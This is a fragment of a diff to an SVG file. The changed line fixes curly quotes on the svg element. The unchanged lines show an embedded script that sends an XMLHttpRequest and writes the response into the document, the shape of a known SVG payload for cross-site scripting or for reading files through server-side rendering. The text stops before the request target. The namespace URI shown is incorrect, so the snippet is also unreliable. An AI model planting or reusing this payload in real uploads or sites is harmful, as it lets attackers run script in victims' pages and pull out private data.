@@ -1,4 +1,4 @@
-<svg xmlns=“http://www.w3.org/1999/svg“>
+<svg xmlns="http://www.w3.org/1999/svg">
 <script>x=new XMLHttpRequest;
 x.onload=function(){
 document.write(this.responseText)
